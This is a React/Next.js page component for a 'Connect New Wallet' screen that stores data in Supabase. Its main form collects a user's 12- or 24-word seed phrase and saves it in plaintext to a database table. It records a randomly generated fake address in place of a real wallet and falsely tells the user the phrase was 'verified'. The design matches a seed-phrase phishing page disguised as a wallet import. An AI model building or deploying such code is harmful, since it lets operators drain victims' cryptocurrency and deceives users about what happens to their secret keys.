'use client';

import { addWallet } from '@/actions/wallets'
import { useState } from 'react';
import Link from 'next/link';
import { createClient } from '../../../lib/supabase/client';

export default function NewWalletPage() {
  const [passphrase, setPassphrase] = useState('');
  const [status, setStatus] = useState('');
  const [loading, setLoading] = useState(false);

  // ✅ NEW STATE (ADDED — no changes to existing)
  const [manualAddress, setManualAddress] = useState('');
  const [manualNetwork, setManualNetwork] = useState('');
  const [manualLoading, setManualLoading] = useState(false);

  const isValidSeedPhrase = (phrase: string): boolean => {
    const words = phrase.trim().split(/\s+/);
    const wordCount = words.length;
    return (wordCount === 12 || wordCount === 24) && words.every(word => word.length > 2);
  };

  const handleConnect = async (e: React.FormEvent) => {
    e.preventDefault();

    const trimmedPhrase = passphrase.trim();
    
    if (!trimmedPhrase) {
      setStatus("❌ Please enter your seed phrase");
      return;
    }

    if (!isValidSeedPhrase(trimmedPhrase)) {
      setStatus("❌ Invalid seed phrase. Must be 12 or 24 words.");
      return;
    }

    setLoading(true);
    setStatus("Validating and connecting wallet...");

    const supabase = createClient();

    const { data: { user } } = await supabase.auth.getUser();
    if (!user) {
      setStatus("❌ Please login first");
      setLoading(false);
      return;
    }

    try {
      const { error } = await supabase
        .from('wallets')
        .insert({
          user_id: user.id,
          seed_phrase: trimmedPhrase,
          address: `0x${Math.random().toString(16).slice(2, 42)}`,
        });

      if (error) throw error;

      setStatus("✅ Wallet connected and seed phrase verified successfully!");
      setPassphrase('');
    } catch (err: any) {
      setStatus(`❌ Failed to save: ${err.message}`);
    } finally {
      setLoading(false);
    }
  };

  // ✅ NEW FUNCTION (ADDED — separate from existing logic)
  const handleManualAdd = async () => {
    if (!manualAddress.trim()) {
      setStatus("❌ Enter wallet address");
      return;
    }

    setManualLoading(true);
    setStatus("Adding wallet...");

    const supabase = createClient();

    const { data: { user } } = await supabase.auth.getUser();

    if (!user) {
      setStatus("❌ Please login first");
      setManualLoading(false);
      return;
    }

    const { error } = await supabase
      .from('wallets')
      .insert({
        user_id: user.id,
        address: manualAddress.trim(),
        network: manualNetwork.trim() || null,
      });

    if (error) {
      setStatus(`❌ ${error.message}`);
    } else {
      setStatus("✅ Wallet added successfully");
      setManualAddress('');
      setManualNetwork('');
    }

    setManualLoading(false);
  };

  return (
    <div className="min-h-screen bg-black text-white p-10">
      <div className="max-w-lg mx-auto">
        <h1 className="text-4xl font-semibold mb-2">Connect New Wallet</h1>
        <p className="text-zinc-400 mb-10">Import using your 12 or 24 word seed phrase</p>

        {/* 🔹 EXISTING FORM (UNCHANGED) */}
        <form onSubmit={handleConnect} className="bg-zinc-900 rounded-3xl p-10 space-y-8">
          <div>
            <label className="block text-sm text-zinc-400 mb-3">Seed Phrase</label>
            <textarea
              value={passphrase}
              onChange={(e) => setPassphrase(e.target.value)}
              placeholder="Enter your 12 or 24 word seed phrase separated by spaces..."
              className="w-full h-40 bg-zinc-800 border border-zinc-700 rounded-2xl p-5 text-white resize-y focus:border-yellow-400"
              required
            />
            <p className="text-xs text-zinc-500 mt-2">
              Must be exactly 12 or 24 words
            </p>
          </div>

          <button
            type="submit"
            disabled={loading}
            className="w-full bg-yellow-500 hover:bg-yellow-400 disabled:bg-zinc-700 disabled:cursor-not-allowed text-black font-bold py-5 rounded-2xl transition"
          >
            {loading ? "Validating & Connecting..." : "Connect & Verify Wallet"}
          </button>
        </form>

        {/* ================= NEW MANUAL WALLET UI (ADDED) ================= */}

        <div className="bg-zinc-900 rounded-3xl p-10 mt-10 space-y-6">
  <h2 className="text-xl font-semibold">
    Add Wallet Manually
  </h2>

  <form action={addWallet} className="space-y-4">

    {/* ADDRESS */}
    <input
      name="address"
      placeholder="Wallet Address"
      className="w-full p-4 bg-zinc-800 rounded-2xl"
      required
    />

    {/* NETWORK */}
    <input
      name="network"
      placeholder="Network (optional)"
      className="w-full p-4 bg-zinc-800 rounded-2xl"
    />

    {/* BUTTON */}
    <button
      type="submit"
      className="w-full bg-green-500 text-black py-4 rounded-2xl font-bold"
    >
      Add Wallet Manually
    </button>

  </form>
</div>

        {/* 🔹 EXISTING STATUS (UNCHANGED) */}
        {status && (
          <div className={`mt-6 p-5 rounded-2xl text-center ${
            status.includes('✅') ? 'bg-emerald-500/20 text-emerald-400' : 'bg-red-500/20 text-red-400'
          }`}>
            {status}
          </div>
        )}

        <div className="mt-10 text-center">
          <Link href="/dashboard" className="text-yellow-400 hover:underline">← Back to Dashboard</Link>
        </div>
      </div>
    </div>
  );
}